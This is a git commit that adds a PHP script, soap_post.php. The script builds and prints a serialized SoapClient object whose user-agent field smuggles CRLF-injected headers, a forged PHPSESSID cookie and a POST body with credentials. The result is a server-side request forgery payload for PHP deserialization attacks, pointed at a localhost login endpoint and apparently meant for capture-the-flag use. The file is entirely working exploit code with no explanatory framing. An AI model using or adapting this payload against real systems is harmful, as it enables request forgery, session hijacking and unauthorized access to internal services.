86f4923427c3ac48aae550743de7b50d85274847
MorouU <59440988+MorouU@users.noreply.github.com>
2020-11-10 11:36:44 +0800

    Create soap_post.php

---
+++ PHP/soap_post.php
@@ -0,0 +1,54 @@
+<?php
+class get_simple_soap{
+	
+	static public $url = 'http://127.0.0.1/page/login/qhq-run';
+	static public $ua = 'DQ';
+	static public $params = array();
+	static public $data = array('username' => 'DQ','password'=>'baEN2y8sqr9Ma7HrY2FV3HYXq2ZATdkt8WVN7DtjpRPaTz2Egx');
+	static public $cookie = array('PHPSESSID' => 'dudtev0j8eplfhn57ai764hdkn');
+	static public $headers = array('z'=>'ls');
+	
+	private function soap_data($config){
+	
+		$cookie = array();
+		$headers = array();
+		foreach($config['cookies'] as $key => $value){
+			array_push($cookie,$key.'='.$value);
+		}
+		foreach($config['headers'] as $key => $value){
+			array_push($headers,$key.':'.$value);
+		}
+	
+		$params = http_build_query($config['params']);
+		$data = http_build_query($config['data']);
+		$content_type = 'Content-Type: application/x-www-form-urlencoded';
+		$content_length = 'Content-Length: '.strlen($data);
+		$contents = join("\x0d\x0a",array($config['ua'],'Cookie: '.join(';',$cookie),join("\x0d\x0a",$headers),$content_type,$content_length))."\x0d\x0a\x0d\x0a".$data;
+
+		$soap = new SoapClient(null, array(
+			'location' => $config['url'].'?'.$params,
+			'user_agent' => $contents,
+			'uri' => '2333'
+		));
+
+		return serialize($soap);
+	
+	}
+	
+	public function __toString(){
+	
+		return $this->soap_data(array(
+				'url' => self::$url,
+				'ua' => self::$ua,
+				'params' => self::$params,
+				'data' => self::$data,
+				'cookies' => self::$cookie,
+				'headers' => self::$headers
+				));	
+	}
+	
+}
+
+echo (string) new get_simple_soap();
+
+?>
